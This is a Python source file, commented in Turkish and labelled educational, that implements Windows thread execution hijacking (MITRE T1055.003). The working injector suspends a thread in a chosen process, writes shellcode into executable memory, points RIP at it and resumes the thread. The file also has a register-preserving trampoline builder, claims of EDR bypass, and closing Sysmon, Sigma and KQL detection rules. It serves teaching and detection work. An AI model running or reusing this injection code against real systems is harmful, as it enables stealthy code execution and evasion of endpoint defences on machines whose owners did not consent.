"""
Technique 5: Thread Hijacking (Thread Context Injection)
=========================================================
Mevcut thread'in execution flow'unu değiştirerek shellcode çalıştırma.

MITRE ATT&CK: T1055.003 - Process Injection: Thread Execution Hijacking

API Çağrı Sırası:
1. OpenProcess() - Process handle
2. OpenThread() - Thread handle
3. SuspendThread() - Thread'i durdur
4. VirtualAllocEx() - Bellek ayır
5. WriteProcessMemory() - Shellcode yaz
6. GetThreadContext() - Mevcut context'i al
7. SetThreadContext() - RIP'i shellcode'a yönlendir
8. ResumeThread() - Thread'i devam ettir

Author: Ugur Ates
Purpose: Educational
"""

import ctypes
from ctypes import wintypes
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.win_api import (
    OpenProcess, OpenThread, VirtualAllocEx, WriteProcessMemory,
    SuspendThread, ResumeThread, GetThreadContext, SetThreadContext,
    CloseHandle, CONTEXT64, CONTEXT_FULL,
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
    PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, GetLastError
)

# ============================================================================
# EXPLANATION
# ============================================================================

TECHNIQUE_INFO = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                     TECHNIQUE 5: THREAD HIJACKING                             ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  📖 AÇIKLAMA:                                                                ║
║  ─────────────                                                               ║
║  Thread Hijacking, mevcut bir thread'in çalışmasını durdurup, instruction    ║
║  pointer'ını (RIP/EIP) shellcode adresine yönlendirerek çalıştırır.          ║
║  CreateRemoteThread kullanmadığı için bazı EDR'ları bypass edebilir.         ║
║                                                                              ║
║  🔄 ÇALIŞMA PRENSİBİ:                                                        ║
║  ─────────────────────                                                       ║
║                                                                              ║
║  ┌─────────────────────────────────────────────────────────────────────┐    ║
║  │                     BEFORE HIJACKING                                │    ║
║  │                                                                     │    ║
║  │  Thread Context                    Target Process Memory            │    ║
║  │  ┌─────────────────┐              ┌─────────────────────────┐      │    ║
║  │  │ RIP: 0x7FF...   │──────────────│ Normal Code Execution   │      │    ║
║  │  │ RSP: 0x000...   │              │ mov rax, rbx            │      │    ║
║  │  │ RAX: 0x...      │              │ call some_func          │      │    ║
║  │  │ RBX: 0x...      │              │ ...                     │      │    ║
║  │  └─────────────────┘              └─────────────────────────┘      │    ║
║  │                                                                     │    ║
║  └─────────────────────────────────────────────────────────────────────┘    ║
║                                                                              ║
║                              │ SuspendThread()                               ║
║                              │ GetThreadContext()                            ║
║                              │ VirtualAllocEx() + WriteProcessMemory()       ║
║                              │ SetThreadContext() ← RIP değiştir             ║
║                              │ ResumeThread()                                ║
║                              ▼                                               ║
║                                                                              ║
║  ┌─────────────────────────────────────────────────────────────────────┐    ║
║  │                     AFTER HIJACKING                                 │    ║
║  │                                                                     │    ║
║  │  Thread Context                    Target Process Memory            │    ║
║  │  ┌─────────────────┐              ┌─────────────────────────┐      │    ║
║  │  │ RIP: 0xABC...   │──────┐       │ Normal Code (paused)    │      │    ║
║  │  │ RSP: 0x000...   │      │       └─────────────────────────┘      │    ║
║  │  │ RAX: 0x...      │      │                                        │    ║
║  │  │ RBX: 0x...      │      │       ┌─────────────────────────┐      │    ║
║  │  └─────────────────┘      └──────►│ INJECTED SHELLCODE      │      │    ║
║  │                                   │ fc 48 83 e4 f0 e8...    │      │    ║
║  │                                   │ [Calculator opens!]     │      │    ║
║  │                                   └─────────────────────────┘      │    ║
║  │                                                                     │    ║
║  └─────────────────────────────────────────────────────────────────────┘    ║
║                                                                              ║
║  🎯 AVANTAJLARI:                                                             ║
║  ────────────────                                                            ║
║  • CreateRemoteThread kullanmaz (daha az izlenen)                            ║
║  • Yeni thread oluşturmaz                                                    ║
║  • Mevcut thread'in context'inde çalışır                                     ║
║                                                                              ║
║  ⚠️ DEZAVANTAJLARI:                                                          ║
║  ──────────────────                                                          ║
║  • Thread'i bozabilir (crash riski)                                          ║
║  • SetThreadContext izleniyor                                                ║
║  • Orijinal execution'a dönmek zor                                          ║
║                                                                              ║
║  🛡️ TESPİT GÖSTERGELERİ:                                                     ║
║  ────────────────────────                                                    ║
║  • SuspendThread + SetThreadContext kombinasyonu                             ║
║  • RIP değişikliği (özellikle private memory'ye)                            ║
║  • Cross-process thread context modification                                 ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

# ============================================================================
# HELPER: Get threads of a process
# ============================================================================

def get_process_threads(pid: int) -> list:
    """Process'e ait thread ID'lerini döndür"""
    import subprocess
    threads = []
    try:
        cmd = f'(Get-Process -Id {pid}).Threads | Select-Object -ExpandProperty Id'
        output = subprocess.check_output(['powershell', '-Command', cmd], text=True)
        for line in output.strip().split('\n'):
            try:
                threads.append(int(line.strip()))
            except:
                pass
    except:
        pass
    return threads

# ============================================================================
# THREAD HIJACKING IMPLEMENTATION
# ============================================================================

def hijack_thread(shellcode: bytes, target_pid: int, verbose: bool = True) -> bool:
    """
    Thread Hijacking gerçekleştir.
    
    Args:
        shellcode: Çalıştırılacak shellcode
        target_pid: Hedef process PID
        verbose: Detaylı çıktı
    
    Returns:
        bool: Başarı durumu
    """
    if verbose:
        print(TECHNIQUE_INFO)
        print(f"\n🎯 Hedef PID: {target_pid}")
        print("="*60)
    
    # Step 1: Open process
    if verbose:
        print("\n[1/8] OpenProcess() - Process handle alma...")
    
    process_handle = OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)
    if not process_handle:
        print(f"❌ OpenProcess başarısız! Error: {GetLastError()}")
        return False
    
    if verbose:
        print(f"   ✅ Process handle: 0x{process_handle:X}")
    
    try:
        # Step 2: Find threads
        if verbose:
            print("\n[2/8] Thread'leri bulma...")
        
        threads = get_process_threads(target_pid)
        if not threads:
            print("❌ Thread bulunamadı!")
            return False
        
        target_tid = threads[0]  # İlk thread'i hedef al
        if verbose:
            print(f"   📋 Bulunan thread'ler: {threads[:5]}")
            print(f"   🎯 Hedef TID: {target_tid}")
        
        # Step 3: Open thread
        if verbose:
            print("\n[3/8] OpenThread() - Thread handle alma...")
        
        thread_handle = OpenThread(THREAD_ALL_ACCESS, False, target_tid)
        if not thread_handle:
            print(f"❌ OpenThread başarısız! Error: {GetLastError()}")
            return False
        
        if verbose:
            print(f"   ✅ Thread handle: 0x{thread_handle:X}")
        
        try:
            # Step 4: Suspend thread
            if verbose:
                print("\n[4/8] SuspendThread() - Thread'i durdurma...")
            
            suspend_count = SuspendThread(thread_handle)
            if suspend_count == 0xFFFFFFFF:
                print(f"❌ SuspendThread başarısız! Error: {GetLastError()}")
                return False
            
            if verbose:
                print(f"   ✅ Thread suspended (count: {suspend_count})")
            
            # Step 5: Allocate memory
            if verbose:
                print("\n[5/8] VirtualAllocEx() - Bellek ayırma...")
            
            remote_addr = VirtualAllocEx(
                process_handle, None, len(shellcode),
                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
            )
            
            if not remote_addr:
                print(f"❌ VirtualAllocEx başarısız!")
                ResumeThread(thread_handle)
                return False
            
            if verbose:
                print(f"   ✅ Allocated: 0x{remote_addr:016X}")
            
            # Step 6: Write shellcode
            if verbose:
                print("\n[6/8] WriteProcessMemory() - Shellcode yazma...")
            
            bytes_written = ctypes.c_size_t()
            result = WriteProcessMemory(
                process_handle, remote_addr, shellcode,
                len(shellcode), ctypes.byref(bytes_written)
            )
            
            if not result:
                print(f"❌ WriteProcessMemory başarısız!")
                ResumeThread(thread_handle)
                return False
            
            if verbose:
                print(f"   ✅ Written: {bytes_written.value} bytes")
            
            # Step 7: Get and modify thread context
            if verbose:
                print("\n[7/8] GetThreadContext() + SetThreadContext() - RIP değiştirme...")
            
            context = CONTEXT64()
            context.ContextFlags = CONTEXT_FULL
            
            result = GetThreadContext(thread_handle, ctypes.byref(context))
            if not result:
                print(f"❌ GetThreadContext başarısız! Error: {GetLastError()}")
                ResumeThread(thread_handle)
                return False
            
            original_rip = context.Rip
            if verbose:
                print(f"   📍 Original RIP: 0x{original_rip:016X}")
            
            # Set RIP to our shellcode
            context.Rip = remote_addr
            
            result = SetThreadContext(thread_handle, ctypes.byref(context))
            if not result:
                print(f"❌ SetThreadContext başarısız! Error: {GetLastError()}")
                ResumeThread(thread_handle)
                return False
            
            if verbose:
                print(f"   ✅ New RIP: 0x{context.Rip:016X}")
                print(f"   🔀 RIP redirected to shellcode!")
            
            # Step 8: Resume thread
            if verbose:
                print("\n[8/8] ResumeThread() - Thread'i devam ettirme...")
            
            resume_result = ResumeThread(thread_handle)
            
            if verbose:
                print(f"   ✅ Thread resumed!")
                print("\n" + "="*60)
                print("🎉 THREAD HIJACKING BAŞARILI!")
                print(f"   Original RIP: 0x{original_rip:016X}")
                print(f"   Hijacked RIP: 0x{remote_addr:016X}")
                print("   ⚠️ Target process unstable olabilir!")
                print("="*60)
            
            return True
            
        finally:
            CloseHandle(thread_handle)
    
    finally:
        CloseHandle(process_handle)

# ============================================================================
# SAFER VERSION: Trampoline/Shellcode that returns
# ============================================================================

def create_returning_shellcode(shellcode: bytes, return_addr: int) -> bytes:
    """
    Orijinal execution'a dönen shellcode wrapper oluştur.
    
    Shellcode çalıştıktan sonra orijinal RIP'e geri döner.
    Bu sayede target process crash olmaz.
    """
    # x64: push return_addr; jmp shellcode; ... shellcode ...; ret
    
    # Basitleştirilmiş - gerçek implementasyon daha karmaşık
    wrapper = b""
    
    # Save all registers
    wrapper += b"\x50"  # push rax
    wrapper += b"\x51"  # push rcx
    wrapper += b"\x52"  # push rdx
    wrapper += b"\x53"  # push rbx
    wrapper += b"\x56"  # push rsi
    wrapper += b"\x57"  # push rdi
    
    # Push return address
    wrapper += b"\x48\xB8" + return_addr.to_bytes(8, 'little')  # mov rax, return_addr
    wrapper += b"\x50"  # push rax
    
    # Original shellcode
    wrapper += shellcode
    
    # Restore and return
    wrapper += b"\x5F"  # pop rdi
    wrapper += b"\x5E"  # pop rsi
    wrapper += b"\x5B"  # pop rbx
    wrapper += b"\x5A"  # pop rdx
    wrapper += b"\x59"  # pop rcx
    wrapper += b"\x58"  # pop rax
    wrapper += b"\xC3"  # ret (to original RIP)
    
    return wrapper

# ============================================================================
# DETECTION RULES
# ============================================================================

DETECTION_RULES = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                    🛡️ BLUE TEAM DETECTION RULES                              ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  📋 SYSMON DETECTION:                                                        ║
║  ─────────────────────                                                       ║
║                                                                              ║
║  <!-- Cannot directly detect SetThreadContext, but can correlate -->         ║
║  <ProcessAccess onmatch="include">                                           ║
║    <GrantedAccess condition="contains">0x1F0FFF</GrantedAccess>              ║
║    <SourceImage condition="excludes">\\System32\\</SourceImage>              ║
║  </ProcessAccess>                                                            ║
║                                                                              ║
║  📋 SIGMA RULE:                                                              ║
║  ──────────────                                                              ║
║                                                                              ║
║  title: Thread Context Modification                                          ║
║  status: experimental                                                        ║
║  logsource:                                                                  ║
║    product: windows                                                          ║
║    category: api_call                                                        ║
║  detection:                                                                  ║
║    selection_suspend:                                                        ║
║      ApiCall: 'SuspendThread'                                                ║
║    selection_context:                                                        ║
║      ApiCall: 'SetThreadContext'                                             ║
║    timeframe: 5s                                                             ║
║    condition: selection_suspend and selection_context                        ║
║  level: high                                                                 ║
║  tags:                                                                       ║
║    - attack.t1055.003                                                        ║
║                                                                              ║
║  📋 KQL QUERY:                                                               ║
║  ─────────────                                                               ║
║                                                                              ║
║  // Detect thread context modification                                       ║
║  DeviceEvents                                                                ║
║  | where ActionType == "SetThreadContextApiCall"                             ║
║  | where InitiatingProcessId != TargetProcessId                              ║
║  | project Timestamp, DeviceName,                                            ║
║            InitiatingProcessFileName,                                        ║
║            TargetProcessFileName,                                            ║
║            TargetThreadId                                                    ║
║                                                                              ║
║  // Correlate with memory allocation                                         ║
║  DeviceEvents                                                                ║
║  | where ActionType in ("SetThreadContextApiCall",                           ║
║                         "NtAllocateVirtualMemoryRemoteApiCall")              ║
║  | summarize Actions=make_set(ActionType) by                                 ║
║              InitiatingProcessId, TargetProcessId, bin(Timestamp, 10s)       ║
║  | where array_length(Actions) >= 2                                          ║
║                                                                              ║
║  📋 ETW:                                                                     ║
║  ───────                                                                     ║
║                                                                              ║
║  Provider: Microsoft-Windows-Kernel-Audit-API-Calls                          ║
║  Event: NtSetContextThread                                                   ║
║                                                                              ║
║  📋 BEHAVIORAL INDICATORS:                                                   ║
║  ──────────────────────────                                                  ║
║                                                                              ║
║  1. SuspendThread → SetThreadContext → ResumeThread sequence                 ║
║  2. Cross-process thread manipulation                                        ║
║  3. RIP pointing to private memory (not module)                              ║
║  4. Thread state changes correlating with memory writes                      ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

# ============================================================================
# MAIN
# ============================================================================

if __name__ == "__main__":
    print(TECHNIQUE_INFO)
    
    # Load shellcode
    try:
        from payloads.test_shellcodes import CALC_SHELLCODE_X64
        shellcode = CALC_SHELLCODE_X64
        print(f"\n📦 Shellcode yüklendi: {len(shellcode)} bytes")
    except ImportError:
        shellcode = bytes([0x90] * 100 + [0xC3])
    
    # Get target
    print("\n⚠️ DİKKAT: Thread hijacking hedef process'i crash edebilir!")
    pid = input("Hedef PID (notepad.exe önerilir): ").strip()
    
    try:
        target_pid = int(pid)
    except ValueError:
        print("Geçersiz PID")
        sys.exit(1)
    
    confirm = input("⚠️ Devam edilsin mi? (y/n): ").strip().lower()
    if confirm != 'y':
        print("İptal edildi.")
        sys.exit(0)
    
    hijack_thread(shellcode, target_pid)
    print(DETECTION_RULES)
